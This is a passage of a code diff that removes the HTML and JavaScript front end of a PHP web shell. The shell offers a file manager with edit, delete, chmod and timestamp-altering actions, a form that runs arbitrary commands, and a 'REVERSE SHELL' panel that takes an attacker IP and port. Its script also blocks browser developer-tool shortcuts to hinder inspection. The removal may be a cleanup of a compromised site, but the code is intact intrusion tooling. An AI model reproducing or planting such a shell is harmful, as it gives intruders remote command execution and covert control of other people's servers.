-            else { echo "<a href='#' onclick=\"return openEditModal(event, '?edit=".urlencode($full)."&ajax=1')\" style='color:#ccc; text-decoration:none; font-weight:500;'>$name</a>"; }
-            echo "</div>";
-            echo "<div class='col-date'>$modTimeFormatted</div>";
-            echo "<div class='col-size'>$size</div>";
-            echo "<div class='col-perms'><span class='perm-click $perm_class' onclick=\"openModal('?chmod_modal=".urlencode($full)."&ajax=1')\">$perm</span></div>";
-            echo "<div class='col-actions'>";
-            if (!$isDir) {
-                echo "<a href='?download=".urlencode($full)."' class='btn-action btn-down' title='Download'>⤓</a>";
-                echo "<button onclick=\"openModal('?edit=".urlencode($full)."&ajax=1');\" class='btn-action btn-edit' title='Edit'>📝</button>";
-                echo "<button onclick=\"openModal('?touch_modal=".urlencode($full)."&ajax=1');\" class='btn-action btn-touch' title='Touch Time'>🕓</button>";
-            }
-            if ($item !== '..') {
-                echo "<button onclick=\"openModal('?rename=".urlencode($full)."&ajax=1');\" class='btn-action btn-rename' title='Rename'>🔄</button>";
-            }
-            echo "<a href='?delete=".urlencode($full)."&dir=".urlencode($currentDir)."' onclick='return confirm(\"Delete $name?\")' class='btn-action' style='color:var(--c-del);' title='Delete'>❌</a>";
-            echo "</div></div>";
-        }
-        ?>
-    </div>
-</div>
-
-<div id="simpleTerminal" class="modal" style="display: <?= $show_terminal ? 'block' : 'none'; ?>">
-    <div class="modal-content">
-        <span class="modal-close" onclick="window.location.href='?dir=<?= urlencode($currentDir) ?>'">&times;</span>
-        <h3 style="color:var(--c-down); margin-top:0;">TERMINAL</h3>
-        <div class="term-box"><?= htmlspecialchars($term_output) ?></div>
-        <form method="GET">
-            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
-            <input type="text" name="cmd" class="term-input" placeholder="Enter command..." autocomplete="off">
-            <button type="submit" class="btn-primary">EXECUTE</button>
-        </form>
-    </div>
-</div>
-
-<div id="reverseShellModal" class="modal">
-<div class="modal-content">
-<span class="modal-close" onclick="document.getElementById('reverseShellModal').style.display='none'">&times;</span>
-<h3 style="color:var(--c-touch); margin-top:0;">REVERSE SHELL</h3>
-<form onsubmit="startReverseShell(event)">
-<input type="text" id="attackerIP" placeholder="192.168.1.100" style="width:100%;padding:10px;background:#111;border:1px solid #333;color:#fff;border-radius:6px;margin-bottom:10px;" required>
-<input type="number" id="attackerPort" placeholder="4444" value="4444" style="width:100%;padding:10px;background:#111;border:1px solid #333;color:#fff;border-radius:6px;margin-bottom:10px;" required>
-<button type="submit" style="background:#fff;color:#000;border:none;padding:12px;width:100%;border-radius:6px;cursor:pointer;font-weight:bold;margin-top:5px;">CONNECT</button>
-</form>
-<div id="rsStatus" style="margin-top:10px;"></div>
-</div>
-</div>
-
-<div id="ajaxModal" class="modal">
-<div class="modal-content">
-<span class="modal-close" onclick="closeAjaxModal()">&times;</span>
-<div id="ajaxContent">Loading...</div>
-</div>
-</div>
-
-<script>
-function openModal(url) {
-    document.getElementById('ajaxContent').innerHTML = 'Loading...';
-    document.getElementById('ajaxModal').style.display = 'block';
-    fetch(url).then(res => res.text()).then(html => {
-        document.getElementById('ajaxContent').innerHTML = html;
-        // Execute scripts in loaded content
-        var scripts = document.getElementById('ajaxContent').querySelectorAll('script');
-        scripts.forEach(function(script) {
-            var newScript = document.createElement('script');
-            newScript.textContent = script.textContent;
-            document.head.appendChild(newScript);
-        });
-    }).catch(() => { document.getElementById('ajaxContent').innerHTML = 'Error'; });
-}
-function closeAjaxModal() { document.getElementById('ajaxModal').style.display = 'none'; }
-function closeModal() { document.getElementById('ajaxModal').style.display = 'none'; }
-
-function openModalWithURL(url) {
-    document.getElementById('ajaxContent').innerHTML = '<p style="color: #ffcc00;">Loading...</p>';
-    document.getElementById('ajaxModal').style.display = 'block';
-    fetch(url).then(res => res.text()).then(html => {
-        document.getElementById('ajaxContent').innerHTML = html;
-        // Execute scripts in loaded content
-        var scripts = document.getElementById('ajaxContent').querySelectorAll('script');
-        scripts.forEach(function(script) {
-            var newScript = document.createElement('script');
-            newScript.textContent = script.textContent;
-            document.head.appendChild(newScript);
-        });
-    }).catch(() => { document.getElementById('ajaxContent').innerHTML = '<p style="color: #ff4444;">Error loading content</p>'; });
-}
-
-function openEditModal(e, url) { e.preventDefault(); openModal(url); }
-
-function saveFile(e) {
-    e.preventDefault();
-    const filePath = document.getElementById('editFilePath').value;
-    const content = document.getElementById('fileContent').value;
-    const status = document.getElementById('editStatus');
-    status.innerHTML = 'Saving...';
-    fetch(window.location.href, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'save_edit=1&target_file=' + encodeURIComponent(filePath) + '&new_content=' + encodeURIComponent(content) })
-    .then(res => res.text()).then(resp => { if (resp.trim() === "OK") { status.innerHTML = '<div class="status success">Saved.</div>'; setTimeout(() => { closeAjaxModal(); location.reload(); }, 1000); } else { status.innerHTML = '<div class="status error">Error</div>'; } });
-}
-
-function setTimeNow(id) { document.getElementById(id).value = ''; }
-function submitTouch(e) {
-    e.preventDefault();
-    const file = document.getElementById('touchFile').value;
-    const time = document.getElementById('newTime').value;
-    const status = document.getElementById('touchStatus');
-    status.innerHTML = 'Updating...';
-    fetch(window.location.href, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'do_touch=1&touch_file=' + encodeURIComponent(file) + '&new_time=' + encodeURIComponent(time) })
-    .then(res => res.text()).then(resp => { if (resp.trim() === "OK") { status.innerHTML = '<div class="status success">Time updated.</div>'; setTimeout(() => { closeAjaxModal(); location.reload(); }, 500); } else { status.innerHTML = '<div class="status error">Error</div>'; } });
-}
-
-function submitRename(e) {
-    e.preventDefault();
-    const newName = document.getElementById('newName').value;
-    const oldPath = document.getElementById('oldPath').value;
-    fetch(window.location.href, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'do_rename=1&old_path=' + encodeURIComponent(oldPath) + '&new_name=' + encodeURIComponent(newName) })
-    .then(res => res.text()).then(resp => { if (resp.trim() === "OK") location.reload(); });
-}
-
-function submitChmod(e) {
-    e.preventDefault();
-    const perm = document.getElementById('newPerm').value;
-    const file = document.getElementById('targetFile').value;
-    const status = document.getElementById('chmodStatus');
-    status.innerHTML = 'Changing...';
-    fetch(window.location.href, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'do_chmod=1&file=' + encodeURIComponent(file) + '&perm=' + encodeURIComponent(perm) })
-    .then(res => res.text()).then(resp => { if (resp.trim() === "OK") { status.innerHTML = '<div class="status success">Done.</div>'; setTimeout(() => { closeAjaxModal(); location.reload(); }, 500); } });
-}
-
-function startReverseShell(e) {
-    e.preventDefault();
-    const ip = document.getElementById('attackerIP').value;
-    const port = document.getElementById('attackerPort').value;
-    const status = document.getElementById('rsStatus');
-    if (!ip || !port) { status.innerHTML = 'Missing data'; return; }
-    status.innerHTML = 'Connecting...';
-    fetch(window.location.href, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'reverse_shell=1&ip=' + encodeURIComponent(ip) + '&port=' + encodeURIComponent(port) })
-    .then(res => res.text()).then(resp => { status.innerHTML = resp; });
-}
-
-window.onclick = function(e) {
-    if (e.target == document.getElementById('ajaxModal')) closeAjaxModal();
-    if (e.target == document.getElementById('reverseShellModal')) document.getElementById('reverseShellModal').style.display='none';
-}
-
-document.addEventListener('keydown', function(e) {
-
-    if (e.key === 'F12') {
-        e.preventDefault();
-        return false;
-    }
-
-    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j')) {
-        e.preventDefault();
-        return false;
-    }
-
-    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-        e.preventDefault();
-        return false;
-    }
-}, false);
-</script>
-</body>
-</html>
-
